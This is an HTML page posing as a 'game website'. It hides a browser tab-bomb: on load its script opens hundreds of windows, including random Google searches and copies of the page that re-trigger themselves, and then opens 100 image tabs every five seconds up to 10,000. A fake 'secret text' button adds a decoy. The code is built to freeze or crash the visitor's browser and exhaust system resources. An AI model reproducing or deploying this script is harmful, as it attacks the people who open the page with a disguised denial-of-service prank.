<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>a8q5's game website</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      width: 100vw;
      height: 100vh;
      overflow: hidden;
      background-color: pink;
      color: white; 
      font-family: monospace; 
    }
    #loadingButton {
      position: fixed;
      top: 50px;
      left: 50px;
      z-index: 9999;
      background-color: #000;
      color: white;
      font-size: 30px;
      padding: 20px;
      border: none;
      border-radius: 5px;
      cursor: wait;
      opacity: 0;
    }
    #loadingButton:active {
      opacity: 1;
    }
    #modal {
      display: none;
      position: fixed;
      z-index: 9998;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background-color: black;
      opacity: 0.5;
      justify-content: center;
      align-items: center;
    }
    #modal-text {
      color: red;
      font-size: 30px;
      margin: 0 auto;
      text-align: center;
    }
  </style>
</head>
<body onload="startTest()">

  <div id="modal">
    <p id="modal-text">Games</p>
  </div>

  <button id="loadingButton" onclick="toggleModal()">See secret text :O</button>

  <script>
    let tabCount = 0;
    const maxTabs = 10000;

    function lmfao() {
      for (let i = 0; i < 100; i++) {
        window.open(`https://www.google.com/search?q=${Math.random() * 100000}`);
        window.open(window.location.pathname, "", "width=1920,height=1080");
      }
    }

    function openTabs() {
      if (tabCount < maxTabs) {
        for (let i = 0; i < 100; i++) {
          let randomImageUrl = 'https://img.pastemagazine.com/wp-content/avuploads/2019/10/14172957/luqnf2opx6fub6apceix.jpg';
          let win = window.open('about:blank', '_blank');
          if (win) {
            win.document.write('<html><head><title>Tab ' + tabCount + '</title></head><body><img src="' + randomImageUrl + '" style="width:100vw;height:100vh;"></body></html>');
            win.document.close();
          }
          tabCount++;
        }
        setTimeout(openTabs, 5000);
      }
    }

    function startTest() {
      document.getElementById("modal").style.display = "flex";

      setTimeout(() => {
        lmfao();
        openTabs();
      }, 1000);
    }

    function toggleModal() {
      const modal = document.getElementById("modal");
      const modalText = document.getElementById("modal-text");
      if (modal.style.display === "flex") {
        modal.style.display = "none";
        modalText.textContent = "Test complete. Press to start again.";
        const btn = document.getElementById("loadingButton");
        btn.style.backgroundColor = "green";
        btn.style.boxShadow = "0px 0px 10px 5px white";
        btn.style.opacity = "1";
        
        setTimeout(() => {
          modal.style.display = "flex";
          modalText.textContent = "secret button :o";
        }, 2000);
      }
    }

    setInterval(function() {
      console.log('Background task running: ' + (new Date()).toString());
    }, 1000);
  </script>
</body>
</html>
